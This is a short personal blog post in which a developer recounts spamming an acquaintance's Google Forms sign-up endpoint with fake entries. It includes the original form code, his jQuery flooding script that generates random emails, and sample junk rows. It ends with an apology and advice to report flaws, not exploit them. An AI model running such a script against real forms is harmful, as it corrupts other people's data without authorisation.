---
title: Sorry, I hacked you.
date: '2016-07-19'
heroImage: '/blog/hacked/i-hacked-you.jpeg'
originalDatePublished: '2016-07-19'
description: " Someone I know from the interwebs posted a site with form that allowed you to sign up to a class of his and he had a huge google sheets security flaw"
author: 'Anthony Lombardi'
image: '/blog/hacked/i-hacked-you.jpeg'
categories: [javascript]
tags: [javascript]
draft: false
---

My biggest concern in developing a website, especially in the current role I have, is to worry about how well a site will perform and how secure it will be. Someone I know from the interwebs posted a site with form that allowed you to sign up to a class of his. I like his work so I was intrigued into how he wrote his backend for the form since he is a front-end developer. His credentials of his backend was in his JS.

```javascript
function postContactToGoogle(f) {
  var email = f.find('.form-email').val();
  var name = f.find('.form-name').val();

  $.ajax({
    url: 'https://docs.google.com/forms/d/jeberish-google-id/formResponse',
    data: {
      entry_1111111111: email,
      entry_1111111117: name,
    },
    type: 'POST',
    dataType: 'xml',
    statusCode: {
      0: function () {
        window.location.replace('/path/thanks');
      },
      200: function () {
        window.location.replace('/path/thanks');
      },
    },
  });
}
```

So I looked at this telling myself it was wrong, or at least there had to be a better way of doing something like that.

I blew up the database(or in this case to a google excel doc) as a challenge to myself to see if I was really right.

```javascript
function rText() {
  var text = '';
  var possible =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  for (var i = 0; i < 5; i++) {
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  }
  return text;
}

function generateEmail() {
  var username, email, full_email;
  username = 'HueBin_';
  email = 'Hacked';
  full_email = username + rText() + '@' + rText() + email + '.com';
  return full_email;
}

function postContactToGoogle() {
  $.ajax({
    url: 'https://docs.google.com/forms/d/jeberish-google-id/formResponse',
    data: {
      entry_1111111111: generateEmail(),
      entry_1111111117: 'HueBin_',
    },
    type: 'POST',
    dataType: 'xml',
    crossDomain: true,
    statusCode: {
      0: function (data) {
        console.log('BAD!', data);
      },
      200: function (data) {
        console.log('GOOD', data);
      },
    },
  });
}

$(function () {
  var num = 1;
  for (var i = 0; i < num; i++) {
    setTimeout(postContactToGoogle(), 50000); // yes thats 50,000!
  }
});
```

this posted info into the database that looked simular to this:

```
  name: HueBun_,Email:HueBin_piMt6@vwq4WHacked.com
  name: HueBun_,Email:HueBin_f7Txq@pzLm6Hacked.com
  name: HueBun_,Email:HueBin_YBTNf@TluieHacked.com
  name: HueBun_,Email:HueBin_QYqVm@jYWuUHacked.com
```

I wrote an email stating that I was really really sorry about it. More so, I meant to contact him sooner, but I just entered another year in my life and I took the weekend off from electronics (mainly because of beer)

conclusion: don't smoke crack! No, when putting anything out in to the publics eyes, do not put the keys to the castle out there for everyone to see. Also, don't go my route. Instead inform of the person of potential bugs rather than acting on exploiting them.
